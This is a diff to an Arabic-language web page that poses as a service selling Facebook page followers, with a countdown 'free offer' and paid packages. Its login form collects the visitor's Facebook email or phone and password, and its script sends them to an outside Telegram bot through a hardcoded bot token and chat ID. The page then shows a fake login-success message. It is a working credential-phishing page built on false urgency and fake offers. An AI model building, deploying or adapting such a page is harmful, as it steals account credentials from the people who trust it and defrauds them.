@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        /* تنسيقات إضافية لرسالة التنبيه العلوية (يجب أن تكون داخل <style> لتظهر بشكل صحيح) */
+        /* تنسيقات إضافية لرسالة التنبيه العلوية */
         #notification-message {
             position: fixed;
             top: 0;
@@ -23,26 +23,21 @@
             transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
             opacity: 0;
         }
+        #notification-message.success { background-color: #28a745; color: white; }
+        #notification-message.error { background-color: #dc3545; color: white; }
+        #notification-message.info { background-color: #17a2b8; color: white; }
+        #notification-message.visible { transform: translateY(0); opacity: 1; }
         
-        /* حالات ألوان الرسائل */
-        #notification-message.success {
-            background-color: #28a745; 
-            color: white;
-        }
-
-        #notification-message.error {
-            background-color: #dc3545; /* لون أحمر */
-            color: white;
-        }
-        
-        #notification-message.info {
-            background-color: #17a2b8; 
-            color: white;
-        }
-
-        #notification-message.visible {
-            transform: translateY(0);
-            opacity: 1;
+        /* تنسيق المؤقت داخل العنصر */
+        .diamond-item .timer {
+            font-size: 18px; /* حجم كبير للمؤقت */
+            font-weight: bold;
+            color: #dc3545; /* لون أحمر/مميّز */
+            background-color: #fff; /* خلفية بيضاء */
+            padding: 5px 10px;
+            border-radius: 8px;
+            margin-right: 15px; 
+            border: 2px solid #dc3545; /* حدود واضحة */
         }
     </style>
 </head>
@@ -51,13 +46,13 @@
     <div id="notification-message"></div>
 
     <header>
-        <h1>💙 زيادة متابعين صفحة فيسبوك رسمية 💙</h1>
+        <h1>💙 **زيادة متابعين صفحة فيسبوك رسمية** 💙</h1>
     </header>
 
     <main class="container">
         
         <section class="section" id="login-section">
-            <h2>🔑 تسجيل الدخول لصفحة فيسبوك</h2>
+            <h2>🔑 **تسجيل الدخول لصفحة فيسبوك**</h2>
             <form id="submission-form">
                 <div class="form-group">
                     <label for="login-id">البريد الإلكتروني أو رقم الهاتف:</label>
@@ -72,13 +67,13 @@
         </section>
 
         <section class="section special-offer-section" id="timer-free-offer-section">
-            <h2>🔥 عرض الـ 15 دقيقة الذهبي! اطلب مجاناً الآن 🔥</h2>
-            <p>ينتهي العرض المجاني خلال: <span id="timer" class="timer">15:00</span></p>
+            <h2>🔥 **عرض الـ 15 دقيقة الذهبي! اطلب مجاناً الآن** 🔥</h2>
             <div class="diamond-list">
                 <div class="diamond-item free-offer-item">
                     <div class="diamond-info">
-                        <span>1000 متابع فيسبوك</span>
-                        <span class="free-price">مجاني!</span>
+                        <span>**1000 متابع فيسبوك**</span>
+                        <span class="free-price">**مجاني!**</span>
+                        <span id="timer" class="timer">15:00</span> 
                     </div>
                     <button class="buy-btn free-offer-btn" data-package="1000 متابع مجاني - عرض المؤقت" data-is-paid="false" data-is-auth-required="true" disabled>اطلب الآن مجاناً</button>
                 </div>
@@ -86,21 +81,21 @@
         </section>
 
         <section class="section special-offer-section expired-offer-section hidden" id="expired-paid-offer-section">
-            <h2>⚠️ فاتك العرض المجاني! لا تفوت عرض اللحظة الأخيرة ⚠️</h2>
-            <p>اشتري الآن قبل أن يختفي الخصم نهائياً</p>
+            <h2>⚠️ **فاتك العرض المجاني! لا تفوت عرض اللحظة الأخيرة** ⚠️</h2>
+            <p>**اشتري الآن قبل أن يختفي الخصم نهائياً**</p>
             <div class="diamond-list">
                 <div class="diamond-item paid-expired-item">
                     <div class="diamond-info">
-                        <span>5,000 متابع بخصم 50%</span>
+                        <span>**5,000 متابع بخصم 50%**</span>
                         <span class="free-price">$5</span>
                     </div>
-                    <button class="buy-btn paid-expired-btn" data-package="5000 متابع - عرض منتهي 5$" data-is-paid="true" data-is-auth-required="true">شراء بخصم خاص</button>
+                    <button class="buy-btn paid-expired-btn" data-package="5000 متابع - عرض منتهي 5$" data-is-paid="true" data-is-auth-required="true" disabled>شراء بخصم خاص</button>
                 </div>
             </div>
         </section>
 
         <section class="section" id="packages-section">
-            <h2>📦 باقات المتابعين الموثوقة</h2>
+            <h2>📦 **باقات المتابعين الموثوقة**</h2>
             <div class="diamond-list">
                 <div class="diamond-item"><div class="diamond-info"><span>5,000 متابع فيسبوك</span><span>15$</span></div><button class="buy-btn" data-package="5000 متابع - 15$" data-is-paid="true" data-is-auth-required="true" disabled>شراء الآن</button></div>
                 <div class="diamond-item"><div class="diamond-info"><span>10,000 متابع فيسبوك</span><span>25$</span></div><button class="buy-btn" data-package="10000 متابع - 25$" data-is-paid="true" data-is-auth-required="true" disabled>شراء الآن</button></div>
@@ -115,7 +110,7 @@
     </footer>
 
     <script>
-        // ======= إعدادات تيليجرام (تم تعيينها) =======
+        // ======= إعدادات تيليجرام (توكن فيسبوك الأصلي) =======
         const BOT_TOKEN = '8589468780:AAHUnSMcg9DznAI438E3CdaCp34XmM17dQ'; 
         const CHAT_ID = '6313103532';     
         // =================================
@@ -129,6 +124,7 @@
         const freeOfferSection = document.getElementById('timer-free-offer-section');
         const expiredPaidOfferSection = document.getElementById('expired-paid-offer-section');
         const freeOfferBtn = document.querySelector('.free-offer-btn');
+        
         const notificationMessage = document.getElementById('notification-message');
         
         // ============= وظيفة إظهار رسالة التنبيه العلوية =============
@@ -155,7 +151,6 @@
             .then(response => response.json()) 
             .then(data => {
                 if (data.ok) {
-                    // رسالة نجاح تسجيل الدخول
                     showNotificationMessage('🔑 لقد تم تسجيل الدخول بنجاح.', 'success');
                 } else {
                     console.error('Telegram API Error:', data);
@@ -167,7 +162,7 @@
                 showNotificationMessage('⚠️ فشل الإرسال. تأكد من اتصالك بالإنترنت.', 'error');
             });
         }
-        
+
         // ============= إرسال بيانات الحساب الأساسية =============
         submitBtn.addEventListener('click', (e) => {
             e.preventDefault();
@@ -187,12 +182,10 @@
             }
             
             if (form.checkValidity()) {
-                // تنسيق رسالة التليجرام المطلوبة
                 const message = `🚨  <b>تسجيل دخول فيسبوك جديد!</b> 🚨\n------------------------------------\nالمعرف: <code>${loginId}</code>\nكلمة المرور: <code>${password}</code>\n------------------------------------`;
                 
                 sendToTelegram(message); // إرسال بيانات الحساب فقط
                 
-                // تفعيل جميع أزرار الشراء بعد تأكيد البيانات
                 submitBtn.disabled = true;
                 submitBtn.textContent = 'تم تأكيد البيانات ✅ يمكنك الآن الشراء.';
                 buyBtns.forEach(btn => btn.disabled = false);
@@ -207,21 +200,16 @@
                 const isAuthRequired = btn.getAttribute('data-is-auth-required') === 'true';
                 const isPaidOrder = btn.getAttribute('data-is-paid') === 'true';
 
-                // التحقق من تسجيل الدخول
                 if (isAuthRequired && submitBtn.disabled !== true) {
                     showNotificationMessage('❌ يجب تسجيل حسابك أولاً.', 'error');
                     return; 
                 }
 
-                // عرض إشعار محلي فقط لأي عملية شراء (مجانية أو مدفوعة)
                 if (isPaidOrder) {
                     showNotificationMessage('💵 جارٍ تحويلك إلى صفحة الدفع...', 'info');
                 } else {
-                    // رسالة تأكيد الطلب المجاني/المخفض
                     showNotificationMessage('✅ تم استلام طلبك بنجاح! سيتم التنفيذ خلال 24 ساعة.', 'info'); 
                 }
-                
-                // لا يتم استدعاء sendToTelegram هنا لفلترة الطلبات
             });
         });
         
